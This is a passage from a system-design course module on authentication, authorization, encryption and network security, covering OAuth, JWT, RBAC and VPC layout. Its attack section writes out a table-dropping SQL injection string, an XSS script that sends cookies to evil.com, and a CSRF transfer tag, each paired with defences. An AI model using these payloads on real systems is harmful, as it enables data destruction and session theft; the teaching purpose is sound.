# Module 29: Security & Authentication

> Security is not an afterthought — it's a fundamental design requirement. Every system design must address authentication (who are you?), authorization (what can you do?), encryption (protecting data), and defense against common attacks. In interviews, mentioning security considerations demonstrates maturity and real-world awareness. This module covers the security landscape from authentication protocols to network security architecture.

---

## 29.1 Authentication

> **Authentication** answers the question: "Who are you?" It's the process of verifying a user's or service's identity. Getting authentication right is critical — a flaw here compromises the entire system.

---

### Username/Password

The most basic authentication mechanism. The user provides a username and password, and the server verifies them against stored credentials.

**How Passwords Should Be Stored:**

```
❌ NEVER store passwords in plaintext:
  users table: { email: "alice@...", password: "MySecret123" }
  → If the database is breached, all passwords are exposed!

❌ NEVER store simple hashes:
  users table: { email: "alice@...", password_hash: SHA256("MySecret123") }
  → Rainbow table attacks can reverse common passwords in seconds

✅ Store salted, slow hashes:
  users table: {
    email: "alice@...",
    password_hash: "$2b$12$LJ3m4ys3Lz0QqV8rKzGx3e.abc123..."  (bcrypt output)
  }
  
  Verification:
    1. User sends password: "MySecret123"
    2. Server retrieves stored hash
    3. Server computes: bcrypt("MySecret123", stored_salt) → compare with stored hash
    4. Match → authenticated; No match → rejected
```

**Password Hashing Algorithms:**

| Algorithm | Speed | Security | Recommendation |
|-----------|-------|----------|---------------|
| **MD5** | Very fast | Broken — collisions found | ❌ Never use |
| **SHA-256** | Fast | Cryptographically secure but too fast for passwords | ❌ Not for passwords (use for data integrity) |
| **bcrypt** | Slow (configurable) | Excellent — designed for passwords | ✅ Good default choice |
| **scrypt** | Slow (memory-hard) | Excellent — resistant to GPU/ASIC attacks | ✅ Good for high-security |
| **Argon2** | Slow (memory + CPU hard) | Best — winner of Password Hashing Competition (2015) | ✅ Best choice for new systems |

**Why Slow is Good for Passwords:**
- A fast hash (SHA-256) can compute billions of hashes per second → brute force is feasible
- A slow hash (bcrypt with cost=12) computes ~3-4 hashes per second → brute force takes years
- The "cost factor" is tunable — increase it as hardware gets faster

---

### Multi-Factor Authentication (MFA)

MFA requires **two or more** independent authentication factors:

| Factor | Type | Examples |
|--------|------|---------|
| **Something you know** | Knowledge | Password, PIN, security questions |
| **Something you have** | Possession | Phone (SMS/TOTP), hardware key (YubiKey), smart card |
| **Something you are** | Biometric | Fingerprint, face recognition, iris scan |

**Common MFA Methods:**

| Method | Security | User Experience | Implementation |
|--------|----------|----------------|---------------|
| **SMS OTP** | Low (SIM swapping, SS7 attacks) | Easy | Send code via SMS |
| **TOTP (Time-based OTP)** | Good | Moderate (requires authenticator app) | Google Authenticator, Authy |
| **Push notification** | Good | Easy (tap to approve) | Duo, Microsoft Authenticator |
| **Hardware key (FIDO2/WebAuthn)** | Highest | Easy (tap the key) | YubiKey, Titan Security Key |
| **Biometric** | Good | Easiest (fingerprint/face) | Device-native (Touch ID, Face ID) |

**TOTP (Time-based One-Time Password):**

```
Setup:
  1. Server generates a secret key: "JBSWY3DPEHPK3PXP"
  2. Server shows QR code containing the secret
  3. User scans QR code with authenticator app
  4. App stores the secret

Verification:
  1. App computes: TOTP = HMAC-SHA1(secret, floor(current_time / 30)) → 6-digit code
  2. User enters the 6-digit code (e.g., "482917")
  3. Server computes the same TOTP using the shared secret
  4. If codes match → authenticated (codes change every 30 seconds)
```

---

### OAuth 2.0

**OAuth 2.0** is an **authorization** framework (not authentication) that allows a third-party application to access a user's resources without knowing their password. It's the standard for "Login with Google/Facebook/GitHub."

**Roles:**

| Role | Description | Example |
|------|-------------|---------|
| **Resource Owner** | The user who owns the data | You (the user) |
| **Client** | The application requesting access | A third-party app (e.g., Notion) |
| **Authorization Server** | Issues tokens after authenticating the user | Google's OAuth server |
| **Resource Server** | Hosts the protected resources | Google's API (Gmail, Calendar) |

**Authorization Code Flow (most secure, for server-side apps):**

```
1. User clicks "Login with Google" on the Client app
2. Client redirects user to Google's Authorization Server:
   GET https://accounts.google.com/o/oauth2/auth
     ?client_id=CLIENT_ID
     &redirect_uri=https://myapp.com/callback
     &response_type=code
     &scope=email profile
     &state=random_csrf_token

3. User logs in to Google and grants permission
4. Google redirects back to Client with an authorization code:
   GET https://myapp.com/callback?code=AUTH_CODE&state=random_csrf_token

5. Client exchanges the code for tokens (server-to-server, not visible to user):
   POST https://oauth2.googleapis.com/token
     client_id=CLIENT_ID
     client_secret=CLIENT_SECRET
     code=AUTH_CODE
     grant_type=authorization_code
     redirect_uri=https://myapp.com/callback

6. Google returns:
   {
     "access_token": "ya29.abc123...",
     "refresh_token": "1//0abc123...",
     "expires_in": 3600,
     "token_type": "Bearer",
     "id_token": "eyJhbGciOiJSUzI1NiIs..."  (if using OpenID Connect)
   }

7. Client uses the access_token to call Google APIs:
   GET https://www.googleapis.com/oauth2/v2/userinfo
     Authorization: Bearer ya29.abc123...
```

```
  User          Client App        Auth Server (Google)     Resource Server
   |                |                    |                       |
   |-- Login ------>|                    |                       |
   |                |-- Redirect ------->|                       |
   |                |                    |                       |
   |<-------------- Login Page ----------|                       |
   |-- Credentials -->                   |                       |
   |                |<-- Auth Code ------|                       |
   |                |                    |                       |
   |                |-- Code + Secret -->|                       |
   |                |<-- Access Token ---|                       |
   |                |                    |                       |
   |                |-- API Request + Token ------------------>|
   |                |<-- Protected Resource -------------------|
   |<-- Response ---|                    |                       |
```

**OAuth 2.0 Grant Types:**

| Grant Type | Use Case | Security |
|-----------|----------|----------|
| **Authorization Code** | Server-side web apps | Most secure (code exchanged server-to-server) |
| **Authorization Code + PKCE** | Mobile apps, SPAs | Secure (no client secret needed; uses code verifier) |
| **Client Credentials** | Service-to-service (no user) | Secure (machine-to-machine) |
| **Implicit** (deprecated) | SPAs (legacy) | ❌ Insecure (token in URL fragment) — use PKCE instead |
| **Resource Owner Password** (deprecated) | Trusted first-party apps | ❌ Insecure (app sees password) — avoid |

---

### OpenID Connect (OIDC)

**OIDC** is an **authentication** layer built on top of OAuth 2.0. While OAuth 2.0 only provides authorization (access tokens), OIDC adds authentication (ID tokens) — it tells you **who the user is**.

```
OAuth 2.0: "This app is allowed to access your Google Calendar" (authorization)
OIDC:      "This user is alice@gmail.com" (authentication) + authorization
```

**OIDC adds to OAuth 2.0:**
- **ID Token** — a JWT containing user identity claims (name, email, picture)
- **UserInfo endpoint** — API to get additional user profile information
- **Standard scopes** — `openid`, `profile`, `email`, `address`, `phone`
- **Discovery** — `.well-known/openid-configuration` endpoint for auto-configuration

**ID Token (JWT):**
```json
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",
  "aud": "your-client-id.apps.googleusercontent.com",
  "exp": 1711036800,
  "iat": 1711033200,
  "email": "alice@gmail.com",
  "name": "Alice Smith",
  "picture": "https://lh3.googleusercontent.com/..."
}
```

---

### SAML (Security Assertion Markup Language)

**SAML** is an older XML-based authentication protocol used primarily in **enterprise SSO** (Single Sign-On).

| Feature | SAML | OIDC |
|---------|------|------|
| Format | XML | JSON (JWT) |
| Transport | HTTP POST/Redirect | HTTP (REST) |
| Token | SAML Assertion (XML) | ID Token (JWT) |
| Use case | Enterprise SSO (Okta, ADFS) | Modern web/mobile apps |
| Complexity | High (XML, certificates) | Lower (JSON, simpler flow) |
| Mobile support | Poor | Excellent |
| Trend | Legacy (still widely used in enterprise) | Modern standard |

**Key Point:** For new systems, use **OIDC** (with OAuth 2.0). Use SAML only when integrating with enterprise identity providers that require it (Okta, Azure AD, ADFS).

---

### JWT (JSON Web Tokens)

A **JWT** is a compact, URL-safe token format for securely transmitting claims between parties. It's the standard token format for OIDC and many API authentication systems.

**JWT Structure:**

```
Header.Payload.Signature

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNjI1MDk3NjAwfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header (base64url decoded):
{
  "alg": "RS256",        // signing algorithm
  "typ": "JWT"
}

Payload (base64url decoded):
{
  "sub": "user_123",     // subject (user ID)
  "name": "Alice",
  "email": "alice@example.com",
  "role": "admin",
  "iat": 1625097600,     // issued at
  "exp": 1625101200,     // expires at (1 hour later)
  "iss": "auth.example.com"  // issuer
}

Signature:
  RS256(base64url(header) + "." + base64url(payload), private_key)
```

**JWT Verification:**

```
1. Receive JWT from client (in Authorization header)
2. Split into header.payload.signature
3. Decode header → get algorithm (RS256)
4. Verify signature using the issuer's PUBLIC key
5. Check expiration (exp > current_time)
6. Check issuer (iss matches expected value)
7. Check audience (aud matches your client ID)
8. If all checks pass → token is valid; extract claims from payload
```

**JWT Signing Algorithms:**

| Algorithm | Type | Key | Use Case |
|-----------|------|-----|----------|
| **HS256** | Symmetric (HMAC) | Shared secret | Simple; both parties share the same secret |
| **RS256** | Asymmetric (RSA) | Private key signs, public key verifies | Standard; issuer signs, anyone can verify |
| **ES256** | Asymmetric (ECDSA) | Private key signs, public key verifies | Smaller keys than RSA; faster |

---

### Session-Based vs Token-Based Authentication

| Feature | Session-Based | Token-Based (JWT) |
|---------|-------------|-------------------|
| **State** | Stateful (session stored on server) | Stateless (token contains all info) |
| **Storage** | Server-side (Redis, memory, DB) | Client-side (cookie, localStorage, memory) |
| **Scalability** | Requires shared session store for horizontal scaling | Naturally scalable (no server-side state) |
| **Revocation** | Easy (delete session from store) | Hard (token is valid until expiry) |
| **Size** | Small (session ID cookie: ~32 bytes) | Larger (JWT: 500-2000 bytes) |
| **Cross-domain** | Difficult (cookies are domain-bound) | Easy (token sent in header) |
| **Mobile** | Awkward (cookies on mobile) | Natural (token in header) |
| **Security** | CSRF risk (cookies sent automatically) | XSS risk (if stored in localStorage) |
| **Best for** | Traditional web apps, when revocation is critical | APIs, mobile apps, microservices, SPAs |

**Hybrid Approach (recommended):**
- Short-lived **access token** (JWT, 15-60 minutes) — stateless, used for API calls
- Long-lived **refresh token** (opaque, stored server-side, 7-30 days) — used to get new access tokens
- Refresh token can be revoked (stored in database) → solves the JWT revocation problem

```
1. User logs in → server returns access_token (JWT, 15 min) + refresh_token (opaque, 30 days)
2. Client uses access_token for API calls (stateless, fast)
3. Access token expires → client sends refresh_token to get a new access_token
4. If refresh_token is revoked (user logged out, compromised) → denied → user must re-login
```

---


## 29.2 Authorization

> **Authorization** answers the question: "What are you allowed to do?" After authentication confirms identity, authorization determines what resources and actions that identity can access. The three main models are RBAC, ABAC, and ACL.

---

### RBAC (Role-Based Access Control)

**RBAC** assigns permissions to **roles**, and roles are assigned to **users**. Users inherit the permissions of their roles.

```
Roles and Permissions:

  Role: Admin
    Permissions: create_user, delete_user, view_user, edit_user, manage_settings

  Role: Editor
    Permissions: view_user, edit_user, create_content, edit_content, publish_content

  Role: Viewer
    Permissions: view_user, view_content

User Assignments:
  Alice → Admin
  Bob → Editor
  Charlie → Viewer, Editor  (can have multiple roles)

Authorization Check:
  Can Bob delete a user?
  Bob's roles: [Editor]
  Editor permissions: [view_user, edit_user, create_content, edit_content, publish_content]
  "delete_user" NOT in permissions → DENIED
```

```sql
-- RBAC Database Schema
CREATE TABLE roles (
    id SERIAL PRIMARY KEY,
    name VARCHAR(50) UNIQUE NOT NULL  -- 'admin', 'editor', 'viewer'
);

CREATE TABLE permissions (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100) UNIQUE NOT NULL  -- 'create_user', 'delete_user', etc.
);

CREATE TABLE role_permissions (
    role_id INT REFERENCES roles(id),
    permission_id INT REFERENCES permissions(id),
    PRIMARY KEY (role_id, permission_id)
);

CREATE TABLE user_roles (
    user_id INT REFERENCES users(id),
    role_id INT REFERENCES roles(id),
    PRIMARY KEY (user_id, role_id)
);

-- Check: Can user 123 perform 'delete_user'?
SELECT 1 FROM user_roles ur
JOIN role_permissions rp ON ur.role_id = rp.role_id
JOIN permissions p ON rp.permission_id = p.id
WHERE ur.user_id = 123 AND p.name = 'delete_user';
```

| Pros | Cons |
|------|------|
| Simple to understand and implement | Role explosion (too many roles for fine-grained control) |
| Easy to audit (who has what role) | Can't express context-dependent rules ("own resources only") |
| Well-supported by frameworks | Changing permissions requires changing role definitions |
| Good for most applications | Not suitable for complex, dynamic access rules |

---

### ABAC (Attribute-Based Access Control)

**ABAC** makes authorization decisions based on **attributes** of the user, resource, action, and environment. It's more flexible than RBAC but more complex.

```
ABAC Policy Examples:

  Policy 1: "Users can edit their OWN profile"
    Subject.id == Resource.owner_id AND Action == "edit"

  Policy 2: "Managers can approve expenses under $10,000"
    Subject.role == "manager" AND Action == "approve" AND Resource.amount < 10000

  Policy 3: "Access is only allowed during business hours from the corporate network"
    Environment.time BETWEEN 09:00 AND 17:00 AND Environment.ip IN corporate_range

  Policy 4: "EU users' data can only be accessed from EU data centers"
    Resource.owner_region == "EU" AND Environment.datacenter_region == "EU"
```

**Attribute Categories:**

| Category | Examples |
|----------|---------|
| **Subject (user)** | user_id, role, department, clearance_level, location |
| **Resource** | resource_id, owner_id, type, sensitivity_level, region |
| **Action** | read, write, delete, approve, publish |
| **Environment** | time, IP address, device type, data center region |

| Pros | Cons |
|------|------|
| Very flexible — can express any access rule | Complex to implement and manage |
| Context-aware (time, location, resource attributes) | Harder to audit ("why was this denied?") |
| No role explosion | Performance overhead (evaluate policies per request) |
| Supports dynamic, fine-grained policies | Requires a policy engine |

---

### ACL (Access Control Lists)

**ACL** directly maps **subjects** to **resources** with specific permissions. Each resource has a list of who can access it and how.

```
File: /documents/report.pdf
  ACL:
    Alice: read, write
    Bob: read
    Engineering Group: read
    Public: (no access)

Database Table: orders
  ACL:
    order_service: SELECT, INSERT, UPDATE
    analytics_service: SELECT
    admin_user: SELECT, INSERT, UPDATE, DELETE
```

| Pros | Cons |
|------|------|
| Simple and intuitive | Doesn't scale (must manage ACL per resource) |
| Fine-grained per-resource control | Hard to audit across the system |
| Used by file systems (Unix permissions) | No support for dynamic/contextual rules |

---

### Policy Engines

For complex authorization, use a dedicated **policy engine** that evaluates access policies centrally.

| Engine | Description | Policy Language |
|--------|-------------|----------------|
| **OPA (Open Policy Agent)** | General-purpose policy engine; Kubernetes, APIs, microservices | Rego (declarative) |
| **Cedar** (AWS) | Policy engine for fine-grained authorization | Cedar (declarative) |
| **Casbin** | Authorization library supporting RBAC, ABAC, ACL | Model config + policy file |
| **Zanzibar** (Google) | Global authorization system (Google Docs, Drive, YouTube) | Relation tuples |
| **SpiceDB** | Open-source Zanzibar implementation | Schema + relationships |

**Google Zanzibar Model (Relationship-Based Access Control):**

```
Relationships (tuples):
  document:report#owner@user:alice
  document:report#viewer@group:engineering#member
  group:engineering#member@user:bob
  group:engineering#member@user:charlie

Check: Can Bob view document:report?
  1. Is Bob a direct viewer? No
  2. Is Bob a member of a group that is a viewer? 
     → group:engineering is a viewer
     → Bob is a member of group:engineering
     → YES, Bob can view!
```

This model powers Google Docs sharing, YouTube permissions, and many other Google services. SpiceDB is the open-source implementation.

---

### Authorization Model Comparison

| Feature | RBAC | ABAC | ACL | Zanzibar |
|---------|------|------|-----|----------|
| Granularity | Role-level | Attribute-level | Resource-level | Relationship-level |
| Flexibility | Moderate | Highest | Low | High |
| Complexity | Low | High | Low | Medium |
| Scalability | Good | Moderate (policy evaluation) | Poor (per-resource) | Excellent (Google-scale) |
| Audit | Easy | Hard | Moderate | Good |
| Best for | Most apps | Complex rules, compliance | File systems, simple apps | Sharing, collaboration, multi-tenant |

---


## 29.3 Encryption

> **Encryption** protects data confidentiality — ensuring that only authorized parties can read the data. Understanding the difference between symmetric and asymmetric encryption, when to use hashing vs encryption, and how to protect data at rest and in transit is essential for secure system design.

---

### Symmetric Encryption (AES)

**Symmetric encryption** uses the **same key** for both encryption and decryption. It's fast and efficient for encrypting large amounts of data.

```
Symmetric Encryption:
  Plaintext + Key → Encrypt → Ciphertext
  Ciphertext + Key → Decrypt → Plaintext
  
  Same key for both operations!
  
  Example (AES-256):
    Key: "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6" (256 bits)
    Plaintext: "Hello, World!"
    Ciphertext: "U2FsdGVkX1+abc123..." (unreadable without the key)
```

**AES (Advanced Encryption Standard):**

| Variant | Key Size | Security | Use Case |
|---------|----------|----------|----------|
| **AES-128** | 128 bits | Strong | General purpose |
| **AES-192** | 192 bits | Stronger | Government/military |
| **AES-256** | 256 bits | Strongest | Highest security requirements |

**AES Modes:**

| Mode | Description | Use Case |
|------|-------------|----------|
| **AES-GCM** | Authenticated encryption (encryption + integrity) | ✅ Recommended default — TLS, API encryption |
| **AES-CBC** | Block cipher with IV; needs separate MAC for integrity | Legacy; still widely used |
| **AES-CTR** | Stream cipher mode; parallelizable | Disk encryption, streaming |

**Key Point:** Always use **AES-GCM** (Galois/Counter Mode) — it provides both encryption (confidentiality) and authentication (integrity) in one operation. Never use ECB mode (patterns in plaintext are visible in ciphertext).

---

### Asymmetric Encryption (RSA, ECC)

**Asymmetric encryption** uses a **key pair**: a public key (shared with everyone) and a private key (kept secret). Data encrypted with the public key can only be decrypted with the private key, and vice versa.

```
Asymmetric Encryption:
  Plaintext + Public Key  → Encrypt → Ciphertext
  Ciphertext + Private Key → Decrypt → Plaintext
  
  Different keys for encryption and decryption!
  
  Use Case 1 — Encryption:
    Alice encrypts with Bob's PUBLIC key → only Bob can decrypt with his PRIVATE key
  
  Use Case 2 — Digital Signature:
    Alice signs with her PRIVATE key → anyone can verify with Alice's PUBLIC key
    (Proves Alice sent the message and it wasn't tampered with)
```

**RSA vs ECC:**

| Feature | RSA | ECC (Elliptic Curve) |
|---------|-----|-----|
| Key size for equivalent security | 2048-4096 bits | 256-384 bits |
| Performance | Slower (larger keys) | Faster (smaller keys) |
| Signature size | Larger | Smaller |
| Adoption | Universal (legacy + modern) | Growing (modern systems) |
| Use case | TLS certificates, JWT signing | TLS 1.3, mobile, IoT |

**Symmetric vs Asymmetric:**

| Feature | Symmetric (AES) | Asymmetric (RSA/ECC) |
|---------|-----------------|---------------------|
| Speed | Fast (1000x faster) | Slow |
| Key management | Must share key securely | Public key can be shared openly |
| Use case | Encrypting data (bulk) | Key exchange, digital signatures, TLS handshake |

**In Practice (TLS):** Asymmetric encryption is used to securely exchange a symmetric key (during the TLS handshake). Then symmetric encryption (AES) is used for the actual data transfer (fast).

---

### Hashing (SHA-256, bcrypt, Argon2)

**Hashing** is a **one-way** function — you can compute the hash from the input, but you cannot reverse it to get the input from the hash. Hashing is NOT encryption (you can't decrypt a hash).

```
Hashing (one-way):
  Input → Hash Function → Hash (fixed-size output)
  "Hello" → SHA-256 → "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
  
  Cannot reverse: hash → ??? → "Hello" (impossible)
  
  Same input ALWAYS produces the same hash (deterministic)
  Different inputs produce different hashes (collision-resistant)
  Small change in input → completely different hash (avalanche effect)
```

**Hash Function Categories:**

| Category | Algorithms | Speed | Use Case |
|----------|-----------|-------|----------|
| **Cryptographic hash** | SHA-256, SHA-3, BLAKE2 | Fast | Data integrity, checksums, digital signatures |
| **Password hash** | bcrypt, scrypt, Argon2 | Intentionally slow | Password storage |
| **Non-cryptographic hash** | MurmurHash, xxHash, CRC32 | Very fast | Hash tables, checksums, Bloom filters |

**When to Use What:**

| Need | Use | NOT |
|------|-----|-----|
| Store passwords | bcrypt / Argon2 (slow, salted) | SHA-256 (too fast), MD5 (broken) |
| Verify file integrity | SHA-256 | MD5 (collision attacks) |
| Digital signatures | SHA-256 (with RSA/ECDSA) | — |
| Hash table keys | MurmurHash, xxHash | SHA-256 (overkill, slow) |
| Bloom filters | MurmurHash | SHA-256 (overkill) |
| Checksums | CRC32, xxHash | — |

---

### Encryption at Rest vs in Transit

**Encryption at Rest:**
Protects data stored on disk — if someone steals the disk or gains unauthorized access to the storage, they can't read the data.

```
Encryption at Rest:
  Application → writes data → Encryption Layer → Encrypted data on disk
  Application → reads data ← Decryption Layer ← Encrypted data on disk
  
  The encryption/decryption is transparent to the application.
```

| Where | How | Example |
|-------|-----|---------|
| **Database** | Transparent Data Encryption (TDE) | PostgreSQL pgcrypto, MySQL TDE, AWS RDS encryption |
| **Object storage** | Server-side encryption | S3 SSE-S3, SSE-KMS, SSE-C |
| **Block storage** | Volume encryption | EBS encryption, LUKS (Linux) |
| **Application** | Application-level encryption | Encrypt sensitive fields before storing |

**S3 Encryption Options:**

| Option | Key Management | Use Case |
|--------|---------------|----------|
| **SSE-S3** | AWS manages keys | Default; simplest |
| **SSE-KMS** | AWS KMS manages keys; you control key policies | Compliance; audit trail of key usage |
| **SSE-C** | You provide the key with each request | Full key control; AWS never stores the key |
| **Client-side** | You encrypt before uploading | Maximum control; AWS never sees plaintext |

**Encryption in Transit:**
Protects data as it travels over the network — prevents eavesdropping and tampering.

```
Encryption in Transit:
  Client ──── TLS/HTTPS ──── Server
  (data is encrypted during transmission)
  
  Service A ──── mTLS ──── Service B
  (mutual authentication + encryption between microservices)
```

| Where | How | Example |
|-------|-----|---------|
| **Client to server** | TLS/HTTPS | All web traffic should use HTTPS |
| **Service to service** | mTLS (mutual TLS) | Istio service mesh, internal APIs |
| **Database connections** | TLS | PostgreSQL `sslmode=require`, MySQL `require_secure_transport` |
| **Message queues** | TLS | Kafka with SSL, RabbitMQ with TLS |

**Key Point:** Enable **both** encryption at rest AND in transit. They protect against different threats — at rest protects against physical theft and unauthorized storage access; in transit protects against network eavesdropping.

---

### Certificate Management

**TLS certificates** prove a server's identity and enable encrypted communication. Managing certificates at scale is a significant operational challenge.

| Tool | Description |
|------|-------------|
| **Let's Encrypt** | Free, automated TLS certificates (90-day validity, auto-renewal) |
| **AWS Certificate Manager (ACM)** | Free TLS certificates for AWS services (ALB, CloudFront, API Gateway) |
| **HashiCorp Vault** | Secrets management + PKI (issue and manage internal certificates) |
| **cert-manager** | Kubernetes-native certificate management (auto-renewal with Let's Encrypt) |

**Certificate Rotation:**
- Certificates expire (Let's Encrypt: 90 days, commercial: 1 year)
- Automate renewal — manual renewal leads to outages when certificates expire
- Use short-lived certificates (hours/days) for internal services (Vault PKI, Istio mTLS)

---


## 29.4 Common Security Concerns in System Design

> In system design interviews, mentioning security concerns and their mitigations demonstrates real-world awareness. These are the most common attacks and defenses you should know.

---

### Attack Types and Defenses

**SQL Injection:**

```
❌ Vulnerable:
  query = "SELECT * FROM users WHERE email = '" + user_input + "'"
  
  User input: "'; DROP TABLE users; --"
  Resulting query: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
  → Deletes the entire users table!

✅ Safe (parameterized query):
  query = "SELECT * FROM users WHERE email = $1"
  params = [user_input]
  → User input is treated as DATA, never as SQL code
```

| Defense | Description |
|---------|-------------|
| **Parameterized queries** | Always use prepared statements / parameterized queries |
| **ORM** | Use an ORM (SQLAlchemy, Hibernate) — they parameterize by default |
| **Input validation** | Validate and sanitize all user input |
| **Least privilege** | Database user should have minimum required permissions |
| **WAF** | Web Application Firewall can detect and block SQL injection patterns |

---

**XSS (Cross-Site Scripting):**

```
❌ Vulnerable:
  <div>Welcome, ${user.name}!</div>
  
  User sets name to: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
  → Script executes in other users' browsers → steals their cookies!

✅ Safe:
  <div>Welcome, ${escapeHtml(user.name)}!</div>
  → <script> tags are escaped to &lt;script&gt; → rendered as text, not executed
```

| Defense | Description |
|---------|-------------|
| **Output encoding** | Escape HTML entities in all user-generated content |
| **Content Security Policy (CSP)** | HTTP header that restricts which scripts can execute |
| **HttpOnly cookies** | Cookies can't be accessed by JavaScript (prevents cookie theft) |
| **Input validation** | Reject or sanitize HTML/script content in user input |
| **Framework auto-escaping** | React, Angular, Vue auto-escape by default |

---

**CSRF (Cross-Site Request Forgery):**

```
Attack:
  1. User is logged into bank.com (has session cookie)
  2. User visits evil.com
  3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=10000">
  4. Browser automatically sends bank.com cookies with the request
  5. Bank processes the transfer (valid session cookie!)
  → Attacker stole $10,000 without the user's knowledge
```

| Defense | Description |
|---------|-------------|
| **CSRF tokens** | Include a random token in forms; verify on server (attacker can't guess the token) |
| **SameSite cookies** | `SameSite=Strict` or `SameSite=Lax` — cookies not sent with cross-site requests |
| **Check Origin/Referer header** | Verify the request came from your domain |
| **Use POST for mutations** | GET requests should never modify state |

---

**DDoS Protection:**

| Layer | Defense | Tools |
|-------|---------|-------|
| **Network (L3/L4)** | Traffic scrubbing, rate limiting, blackholing | AWS Shield, Cloudflare, Akamai |
| **Application (L7)** | Rate limiting, CAPTCHA, bot detection | Cloudflare WAF, AWS WAF |
| **Infrastructure** | Auto-scaling, CDN absorption, geographic distribution | CloudFront, ALB auto-scaling |
| **Architecture** | Anycast (distribute attack across locations), circuit breakers | Cloudflare Anycast |

---

**Rate Limiting:**
Covered in Module 16.1 and Module 14 (LLD Practice). Key points:
- Implement at API Gateway level (centralized)
- Per-user, per-IP, per-endpoint limits
- Return `429 Too Many Requests` with `Retry-After` header
- Algorithms: Token Bucket, Sliding Window

---

**Input Validation:**

```
Validate ALL user input:
  - Type: Is it a string, number, email, URL?
  - Length: Is it within expected bounds? (prevent buffer overflow, storage abuse)
  - Format: Does it match expected pattern? (regex for email, phone)
  - Range: Is the number within valid range? (age: 0-150, price: > 0)
  - Whitelist: Is the value in the allowed set? (status: "active", "inactive")
  - Encoding: Is it valid UTF-8? No null bytes?

Validate on BOTH client AND server:
  Client-side: for user experience (instant feedback)
  Server-side: for security (client-side can be bypassed)
```

---

### Secrets Management

**Never hardcode secrets** (API keys, database passwords, encryption keys) in source code, configuration files, or environment variables in plain text.

```
❌ Bad:
  DATABASE_URL = "postgres://admin:SuperSecret123@db.example.com:5432/mydb"
  (in source code, .env file committed to git, or plain environment variable)

✅ Good:
  DATABASE_URL = vault://secret/data/database/url
  (fetched from a secrets manager at runtime)
```

**Secrets Management Tools:**

| Tool | Description | Best For |
|------|-------------|----------|
| **HashiCorp Vault** | Full-featured secrets management; dynamic secrets, PKI, encryption as a service | Multi-cloud, on-premises |
| **AWS Secrets Manager** | Managed secrets with automatic rotation | AWS-native |
| **AWS SSM Parameter Store** | Simple key-value store for config and secrets | AWS, simpler needs |
| **GCP Secret Manager** | Managed secrets for GCP | GCP-native |
| **Azure Key Vault** | Managed secrets, keys, and certificates | Azure-native |
| **Kubernetes Secrets** | Base64-encoded secrets in K8s (NOT encrypted by default!) | K8s (with external secrets operator for real security) |

**Secrets Best Practices:**
- **Rotate secrets regularly** — automate rotation (Vault, AWS Secrets Manager support auto-rotation)
- **Least privilege** — each service gets only the secrets it needs
- **Audit access** — log who accessed which secrets and when
- **Never log secrets** — mask secrets in logs and error messages
- **Short-lived credentials** — use temporary tokens (AWS STS, Vault dynamic secrets) instead of long-lived passwords
- **Encrypt at rest** — secrets manager should encrypt stored secrets with a master key (KMS)

---


## 29.5 Network Security

> Network security controls **who can communicate with whom** and **how**. In cloud environments, network security is implemented through VPCs, security groups, firewalls, and network segmentation. A well-designed network architecture is the first line of defense against unauthorized access.

---

### VPC, Subnets (Public, Private)

A **VPC (Virtual Private Cloud)** is an isolated virtual network within a cloud provider. You control the IP address range, subnets, routing, and security.

```
VPC Architecture:

  +------------------------------------------------------------------+
  |  VPC: 10.0.0.0/16 (65,536 IPs)                                  |
  |                                                                  |
  |  +---------------------------+  +---------------------------+    |
  |  | Public Subnet             |  | Public Subnet             |    |
  |  | 10.0.1.0/24 (AZ-a)       |  | 10.0.2.0/24 (AZ-b)       |    |
  |  |                           |  |                           |    |
  |  | [ALB] [NAT Gateway]       |  | [ALB] [NAT Gateway]       |    |
  |  | [Bastion Host]            |  |                           |    |
  |  +---------------------------+  +---------------------------+    |
  |                                                                  |
  |  +---------------------------+  +---------------------------+    |
  |  | Private Subnet (App)      |  | Private Subnet (App)      |    |
  |  | 10.0.3.0/24 (AZ-a)       |  | 10.0.4.0/24 (AZ-b)       |    |
  |  |                           |  |                           |    |
  |  | [App Server 1]            |  | [App Server 2]            |    |
  |  | [App Server 3]            |  | [App Server 4]            |    |
  |  +---------------------------+  +---------------------------+    |
  |                                                                  |
  |  +---------------------------+  +---------------------------+    |
  |  | Private Subnet (Data)     |  | Private Subnet (Data)     |    |
  |  | 10.0.5.0/24 (AZ-a)       |  | 10.0.6.0/24 (AZ-b)       |    |
  |  |                           |  |                           |    |
  |  | [RDS Primary]             |  | [RDS Replica]             |    |
  |  | [Redis Primary]           |  | [Redis Replica]           |    |
  |  +---------------------------+  +---------------------------+    |
  +------------------------------------------------------------------+
```

**Public vs Private Subnets:**

| Feature | Public Subnet | Private Subnet |
|---------|-------------|---------------|
| **Internet access** | Direct (Internet Gateway) | Outbound only (via NAT Gateway) |
| **Public IP** | Resources can have public IPs | No public IPs |
| **Inbound from internet** | Yes (through ALB, security groups) | No (not directly reachable) |
| **What goes here** | Load balancers, NAT gateways, bastion hosts | App servers, databases, caches |
| **Security** | More exposed | More protected |

**Key Principle:** Put only what MUST be internet-facing in public subnets (load balancers). Everything else goes in private subnets.

---

### Firewalls and Security Groups

**Security Groups (AWS) / Firewall Rules (GCP/Azure):**
Virtual firewalls that control inbound and outbound traffic at the instance level.

```
Security Group: "web-servers"
  Inbound Rules:
    Allow TCP 443 (HTTPS) from 0.0.0.0/0 (anywhere — internet)
    Allow TCP 80 (HTTP) from 0.0.0.0/0 (redirect to HTTPS)
    Allow TCP 22 (SSH) from 10.0.1.0/24 (bastion subnet only)
  
  Outbound Rules:
    Allow TCP 5432 to sg-database (database security group)
    Allow TCP 6379 to sg-redis (Redis security group)
    Allow TCP 443 to 0.0.0.0/0 (HTTPS to external APIs)

Security Group: "database"
  Inbound Rules:
    Allow TCP 5432 from sg-web-servers (only from app servers)
    Allow TCP 5432 from sg-bastion (for admin access)
  
  Outbound Rules:
    (none needed — databases don't initiate outbound connections)
```

**Security Group Best Practices:**
- **Least privilege** — only allow the minimum required ports and sources
